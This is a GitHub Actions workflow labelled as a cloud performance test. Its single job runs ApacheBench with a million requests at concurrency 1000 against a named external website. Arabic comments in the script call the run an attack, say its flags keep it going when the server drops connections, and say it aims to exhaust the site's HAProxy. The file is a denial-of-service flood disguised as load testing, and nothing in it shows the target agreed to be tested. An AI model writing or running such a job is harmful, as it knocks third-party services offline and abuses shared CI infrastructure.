name: Cloud Performance Test
on: [workflow_dispatch]

jobs:
  test_job:
    runs-on: ubuntu-latest
    steps:
      - name: Launch Stress Test
        run: |
          # تشغيل الهجمة الرسمية بمليون طلب
          # -r لضمان عدم توقف الهجمة إذا حاول السيرفر إغلاق الاتصال
          # -k لتفعيل خاصية الاتصال المستمر (KeepAlive) لإرهاق الـ HAProxy
          ab -r -k -n 1000000 -c 1000 https://a2ztaxi.uk/
